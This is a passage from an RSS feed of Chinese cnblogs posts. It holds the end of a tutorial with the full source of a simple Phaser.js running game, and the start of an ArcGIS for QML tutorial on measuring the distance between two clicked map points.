&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;    clearInterval(enemyTimer);
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; &lt;span&gt;    clearInterval(distanceTimer);
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     player.setTint(0xff0000&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;     gameOver = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;     alert('游戏结束,您跑了' + distance + 'm'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;9&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;6.在update函数中写时间的执行&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;（须注意的是此函数每一帧都在执行，1帧≠1秒）&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; update() {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (cursors.up.isDown &amp;amp;&amp;amp;&lt;span&gt; player.body.touching.down) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         player.setVelocityY(-220&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;         player.anims.play('right', &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (gameOver) {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         player.setVelocityX(0&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         player.anims.play('turn'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;这里我给敌人上了颜色的，随机16进制颜色&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; getColor() {
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; color = [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;].sort(&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(){
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; Math.random() - 0.5
&lt;span&gt;4&lt;/span&gt;     }).join(&quot;&quot;).substr(0,6&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;     
&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt; &quot;0x&quot; +&lt;span&gt; color;
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;整个源码奉上（建议去github上自己clone）：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;103&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; config =&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;  2&lt;/span&gt; &lt;span&gt;    type: Phaser.AUTO,
&lt;/span&gt;&lt;span&gt;  3&lt;/span&gt;     width: 800&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;  4&lt;/span&gt;     height: 400&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;  5&lt;/span&gt; &lt;span&gt;    physics: {
&lt;/span&gt;&lt;span&gt;  6&lt;/span&gt;         &lt;span&gt;default&lt;/span&gt;: 'arcade'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;  7&lt;/span&gt; &lt;span&gt;        arcade: {
&lt;/span&gt;&lt;span&gt;  8&lt;/span&gt; &lt;span&gt;            gravity: {
&lt;/span&gt;&lt;span&gt;  9&lt;/span&gt;                 y: 300
&lt;span&gt; 10&lt;/span&gt; &lt;span&gt;            },
&lt;/span&gt;&lt;span&gt; 11&lt;/span&gt;             debug: &lt;span&gt;false&lt;/span&gt;
&lt;span&gt; 12&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt; 13&lt;/span&gt; &lt;span&gt;    },
&lt;/span&gt;&lt;span&gt; 14&lt;/span&gt; &lt;span&gt;    scene: {
&lt;/span&gt;&lt;span&gt; 15&lt;/span&gt; &lt;span&gt;        preload: preload,
&lt;/span&gt;&lt;span&gt; 16&lt;/span&gt; &lt;span&gt;        create: create,
&lt;/span&gt;&lt;span&gt; 17&lt;/span&gt; &lt;span&gt;        update: update
&lt;/span&gt;&lt;span&gt; 18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 19&lt;/span&gt; &lt;span&gt;};
&lt;/span&gt;&lt;span&gt; 20&lt;/span&gt; 
&lt;span&gt; 21&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; game = &lt;span&gt;new&lt;/span&gt; Phaser.Game(config); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建游戏&lt;/span&gt;
&lt;span&gt; 22&lt;/span&gt; 
&lt;span&gt; 23&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; distanceText; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 路程文本&lt;/span&gt;
&lt;span&gt; 24&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; distance = 0; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 路程&lt;/span&gt;
&lt;span&gt; 25&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; platforms; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 地面&lt;/span&gt;
&lt;span&gt; 26&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; player; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 玩家&lt;/span&gt;
&lt;span&gt; 27&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; enemy; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人&lt;/span&gt;
&lt;span&gt; 28&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; enemys; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人们&lt;/span&gt;
&lt;span&gt; 29&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; gameOver = &lt;span&gt;false&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 游戏结束&lt;/span&gt;
&lt;span&gt; 30&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; enemyTimer; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人计时器&lt;/span&gt;
&lt;span&gt; 31&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; distanceTimer; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 路程计时器&lt;/span&gt;
&lt;span&gt; 32&lt;/span&gt; 
&lt;span&gt; 33&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; cursors; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 按键 &lt;/span&gt;
&lt;span&gt; 34&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 载入资源&lt;/span&gt;
&lt;span&gt; 35&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; preload() {
&lt;/span&gt;&lt;span&gt; 36&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.load.image('sky', 'assets/sky.png'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 37&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.load.image('ground', 'assets/platform.png'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 38&lt;/span&gt;     &lt;span&gt; 39&lt;/span&gt;     &lt;span&gt; 40&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.load.spritesheet('dude', 'assets/dude.png'&lt;span&gt;, {
&lt;/span&gt;&lt;span&gt; 41&lt;/span&gt;         frameWidth: 32&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 42&lt;/span&gt;         frameHeight: 48
&lt;span&gt; 43&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt; 44&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt; 45&lt;/span&gt; 
&lt;span&gt; 46&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将资源展示到画布创建资源&lt;/span&gt;
&lt;span&gt; 47&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; create() {
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加画布背景&lt;/span&gt;
&lt;span&gt; 49&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.add.image(400, 200, 'sky'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 50&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加分数文本&lt;/span&gt;
&lt;span&gt; 51&lt;/span&gt;     distanceText = &lt;span&gt;this&lt;/span&gt;.add.text(16, 16, 'Distance: 0m'&lt;span&gt;, {
&lt;/span&gt;&lt;span&gt; 52&lt;/span&gt;         fontSize: '20px'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 53&lt;/span&gt;         fill: '#000'
&lt;span&gt; 54&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt; 55&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加地面&lt;/span&gt;
&lt;span&gt; 56&lt;/span&gt;     platforms = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.physics.add.staticGroup();
&lt;/span&gt;&lt;span&gt; 57&lt;/span&gt;     platforms.create(400, 400, 'ground').setScale(3&lt;span&gt;).refreshBody();
&lt;/span&gt;&lt;span&gt; 58&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加玩家（精灵）&lt;/span&gt;
&lt;span&gt; 59&lt;/span&gt;     player = &lt;span&gt;this&lt;/span&gt;.physics.add.sprite(100, 300, 'dude'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 60&lt;/span&gt;     player.setBounce(0); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置阻力&lt;/span&gt;
&lt;span&gt; 61&lt;/span&gt;     player.setCollideWorldBounds(&lt;span&gt;true&lt;/span&gt;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 禁止玩家走出世界&lt;/span&gt;
&lt;span&gt; 62&lt;/span&gt; 
&lt;span&gt; 63&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 敌人&lt;/span&gt;
&lt;span&gt; 64&lt;/span&gt;     enemys = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.physics.add.group();
&lt;/span&gt;&lt;span&gt; 65&lt;/span&gt;     enemys.children.iterate(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; (child) {
&lt;/span&gt;&lt;span&gt; 66&lt;/span&gt; 
&lt;span&gt; 67&lt;/span&gt;         child.setCollideWorldBounds(&lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 68&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt; 69&lt;/span&gt; 
&lt;span&gt; 70&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 事件&lt;/span&gt;
&lt;span&gt; 71&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.anims.create({
&lt;/span&gt;&lt;span&gt; 72&lt;/span&gt;         key: 'left'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 73&lt;/span&gt;         frames: &lt;span&gt;this&lt;/span&gt;.anims.generateFrameNumbers('dude'&lt;span&gt;, {
&lt;/span&gt;&lt;span&gt; 74&lt;/span&gt;             start: 0&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 75&lt;/span&gt;             end: 3
&lt;span&gt; 76&lt;/span&gt; &lt;span&gt;        }),
&lt;/span&gt;&lt;span&gt; 77&lt;/span&gt;         frameRate: 10&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 78&lt;/span&gt;         repeat: -1
&lt;span&gt; 79&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt; 80&lt;/span&gt; 
&lt;span&gt; 81&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.anims.create({
&lt;/span&gt;&lt;span&gt; 82&lt;/span&gt;         key: 'right'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 83&lt;/span&gt;         frames: &lt;span&gt;this&lt;/span&gt;.anims.generateFrameNumbers('dude'&lt;span&gt;, {
&lt;/span&gt;&lt;span&gt; 84&lt;/span&gt;             start: 5&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 85&lt;/span&gt;             end: 8
&lt;span&gt; 86&lt;/span&gt; &lt;span&gt;        }),
&lt;/span&gt;&lt;span&gt; 87&lt;/span&gt;         frameRate: 10&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 88&lt;/span&gt;         repeat: -1
&lt;span&gt; 89&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt; 90&lt;/span&gt; 
&lt;span&gt; 91&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.anims.create({
&lt;/span&gt;&lt;span&gt; 92&lt;/span&gt;         key: 'turn'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 93&lt;/span&gt; &lt;span&gt;        frames: [{
&lt;/span&gt;&lt;span&gt; 94&lt;/span&gt;             key: 'dude'&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 95&lt;/span&gt;             frame: 4
&lt;span&gt; 96&lt;/span&gt; &lt;span&gt;        }],
&lt;/span&gt;&lt;span&gt; 97&lt;/span&gt;         frameRate: 20
&lt;span&gt; 98&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt; 99&lt;/span&gt; 
&lt;span&gt;100&lt;/span&gt;     cursors = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.input.keyboard.createCursorKeys();
&lt;/span&gt;&lt;span&gt;101&lt;/span&gt; 
&lt;span&gt;102&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 动态创建敌人&lt;/span&gt;
&lt;span&gt;103&lt;/span&gt;     enemyTimer = setInterval(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {
&lt;/span&gt;&lt;span&gt;104&lt;/span&gt;         enemy = enemys.create(1000, 300, 'dude'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;105&lt;/span&gt; &lt;span&gt;        enemy.setTint(getColor());
&lt;/span&gt;&lt;span&gt;106&lt;/span&gt;         enemy.anims.play('left', &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;107&lt;/span&gt;         enemy.setVelocityX(Phaser.Math.Between(-300, -100&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;108&lt;/span&gt;     }, Phaser.Math.Between(4000, 8000&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;109&lt;/span&gt; 
&lt;span&gt;110&lt;/span&gt;     distanceTimer = setInterval(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {
&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;         distance += 1&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;112&lt;/span&gt;         distanceText.setText('Distance: ' + distance + 'm'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;113&lt;/span&gt;     }, 1000&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;114&lt;/span&gt; 
&lt;span&gt;115&lt;/span&gt; 
&lt;span&gt;116&lt;/span&gt; 
&lt;span&gt;117&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.physics.add.collider(player, platforms); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;玩家在地面上&lt;/span&gt;
&lt;span&gt;118&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.physics.add.collider(enemys, platforms);
&lt;/span&gt;&lt;span&gt;119&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.physics.add.collider(player, enemys, hitBomb, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;120&lt;/span&gt; 
&lt;span&gt;121&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;122&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 一直执行&lt;/span&gt;
&lt;span&gt;123&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; update() {
&lt;/span&gt;&lt;span&gt;124&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (cursors.up.isDown &amp;amp;&amp;amp;&lt;span&gt; player.body.touching.down) {
&lt;/span&gt;&lt;span&gt;125&lt;/span&gt;         player.setVelocityY(-220&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;126&lt;/span&gt;     } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;127&lt;/span&gt;         player.anims.play('right', &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;128&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;129&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (gameOver) {
&lt;/span&gt;&lt;span&gt;130&lt;/span&gt;         player.setVelocityX(0&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;131&lt;/span&gt;         player.anims.play('turn'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;132&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;133&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;134&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;135&lt;/span&gt; 
&lt;span&gt;136&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; hitBomb(player, enemys) {
&lt;/span&gt;&lt;span&gt;137&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.physics.pause();
&lt;/span&gt;&lt;span&gt;138&lt;/span&gt; &lt;span&gt;    clearInterval(enemyTimer);
&lt;/span&gt;&lt;span&gt;139&lt;/span&gt; &lt;span&gt;    clearInterval(distanceTimer);
&lt;/span&gt;&lt;span&gt;140&lt;/span&gt;     player.setTint(0xff0000&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;141&lt;/span&gt;     gameOver = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;142&lt;/span&gt;     alert('游戏结束,您跑了' + distance + 'm'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;143&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;144&lt;/span&gt; 
&lt;span&gt;145&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; getColor() {
&lt;/span&gt;&lt;span&gt;146&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; color = [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;].sort(&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(){
&lt;/span&gt;&lt;span&gt;147&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; Math.random() - 0.5
&lt;span&gt;148&lt;/span&gt;     }).join(&quot;&quot;).substr(0,6&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;149&lt;/span&gt;     
&lt;span&gt;150&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt; &quot;0x&quot; +&lt;span&gt; color;
&lt;/span&gt;&lt;span&gt;151&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
</description>
<pubDate>Fri, 26 Oct 2018 03:31:00 +0000</pubDate>
<dc:creator>ProsperLee</dc:creator>
<og:description>采用的物理引擎是Phaser.js 官网地址：http://phaser.io/ 在这里对此引擎不做过多介绍（因为我也是小白，嘿嘿） 效果展示： 源码（详细源码图片资源可点击文章下方或屏幕右上方的gi</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lprosper/p/9855361.html</dc:identifier>
</item>
<item>
<title>ArcGIS for qml -测距 - 狐狸家的鱼</title>
<link>http://www.cnblogs.com/suRimn/p/9849195.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/suRimn/p/9849195.html</guid>
<description>&lt;blockquote readability=&quot;3.6767676767677&quot;&gt;
&lt;p&gt;源码：&lt;a href=&quot;https://github.com/sueRimn/ArcGIS-for-qml-demos&quot; target=&quot;_blank&quot;&gt;https://github.com/sueRimn/ArcGIS-for-qml-demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;实现求地图上两点之间距离功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026094835462-2078108094.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个功能主要实现鼠标在地图上点击两点进行测距。&lt;/p&gt;
&lt;p&gt;在ArcGIS for qml中是没有直接封装好的测距模块的，查看文档可以看见：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026095132279-1017082858.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;文档明确说明，不能在QML中声明或创建Distance组件&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;1.确认所需&lt;/h3&gt;
&lt;p&gt;实现测距功能，首先还是明确需求，利用鼠标点击进行测距，点击第一次确定起始点，第二次确定终点，终点确定，距离路径出现，随之距离显示出来。&lt;/p&gt;
&lt;p&gt;由此可知，需要&lt;span&gt;两个点&lt;/span&gt;，&lt;span&gt;一条路径&lt;/span&gt;，&lt;span&gt;一个文本&lt;/span&gt;。&lt;/p&gt;
&lt;h3&gt;2.布局&lt;/h3&gt;
&lt;p&gt;（1）地图测距，地基肯定是地图底图，&lt;span&gt;MapView{ Map{ } }&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（2）要在地图上添加点以及路径，需要符号，所以需要图层来承载 &lt;span&gt;GraphicsOverlay{ Graphic{ Symbol:}}&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（3）显示距离，需要一个Text固定位置显示，在最上层 &lt;span&gt;Text{ }&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;3.计算距离&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;（1）单位&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;查看文档中对&lt;span&gt;Distance&lt;/span&gt;的说明，可以看的一个相关的类型叫&lt;span&gt;liearUnit-&amp;gt;&lt;span&gt;实例&lt;/span&gt;&lt;span&gt;或线性测量操作&lt;/span&gt;&lt;span&gt;的特定测量单位&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026100551481-401455921.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;是从Unit类型继承的类型实例被初始化为特定的度量单位&lt;/span&gt;。&lt;/span&gt;&lt;span&gt;每个实例都具有单元名称的属性（单数，复数和缩写），并提供单位转换的方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;往上查看linearUnit的父级可以看到&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026100909528-319407543.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026100940307-543660392.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;Unit是测量单位的基本类型，但是不允许在QML中进行声明和创建。&lt;/span&gt;但是Unit下面的子类型有三个：&lt;span&gt;LinearUnit（线性单位）&lt;/span&gt;、&lt;span&gt;AngularUnit（度量单位）&lt;/span&gt;、&lt;span&gt;AreaUnit（面积单位）&lt;span&gt;都是可以在qml中声明创建的。测距所需的肯定就是线性单位了。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;（2）路径线（Path）&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;关于线段，几何图形都得由polygon来创建，路径是线段，所以选择其中&lt;span&gt;PolylineBuilder&lt;/span&gt;，至于如何生成随机鼠标点击的两点之间的线呢&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在文档中搜索&lt;span&gt;Distance&lt;/span&gt;，可以得到6个类型结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026103544406-734077037.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中，有一个&lt;span&gt;GeodeticDistanceResult&lt;/span&gt; 类型，距离结果，点开看发现不能在QMl中声明创建，但是有一句话&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026103846710-1342728333.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以点击蓝色标注的地方，可以知道，&lt;span&gt;几何引擎&lt;/span&gt;提供一组方法以对几何实例执行几何操作，关于几何的计算都可以在此找到。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;有一个方法&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026110419052-1749382344.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;返回点集成的线&lt;/span&gt;，所需参数都给出了，完全可以得到。这样就得到了path，&lt;span&gt;path是起始点和终点之间的点集成的路径线&lt;/span&gt;，每个点之间的距离长度可以根据&lt;span&gt;maxSegmentLength&lt;/span&gt;进行自行设置。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;（3）计算&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前我们所需的就是如何得到地面距离长度，依然在几何引擎中找&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026110011952-557609491.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1450986/201810/1450986-20181026105252269-1756748903.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所需要的参数依然很容易得到，所以可以完成功能了。&lt;/p&gt;
&lt;h3&gt;4.核心代码&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt; onMouseClicked: {
            clickNum&lt;/span&gt;++
            &lt;span&gt;if&lt;/span&gt;(clickNum == 1){&lt;span&gt;//&lt;/span&gt;&lt;span&gt;鼠标点击第一次 确实起点位置 并添加图形&lt;/span&gt;
&lt;span&gt;                console.log(clickNum)
                dis_startPoint &lt;/span&gt;=&lt;span&gt; mouse.mapPoint
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;graphicsOverlayer.graphics.append(createGraphic(dis_startPoint,startMarkSymbol))&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; dis_start =&lt;span&gt; GeometryEngine.project(dis_startPoint,spatialReference.createWgs84())
                dis_startGraphic.geometry &lt;/span&gt;=&lt;span&gt; dis_start
                console.log(dis_startPoint)
            }
